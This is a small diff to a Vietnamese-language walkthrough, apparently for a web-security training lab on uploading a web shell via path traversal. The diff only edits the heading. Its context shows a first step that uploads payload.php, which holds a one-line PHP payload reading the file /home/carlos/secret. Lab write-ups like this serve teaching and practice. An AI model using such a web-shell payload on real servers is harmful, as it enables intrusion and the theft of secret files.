@@ -1,4 +1,4 @@
-## Web shell upload via path traversal (REFER)
+## Web shell upload via path traversal
 
 1. Sau khi đăng nhập, upload thử file ``payload.php`` có nội dung
 - ```<?php echo file_get_contents('/home/carlos/secret'); ?>```
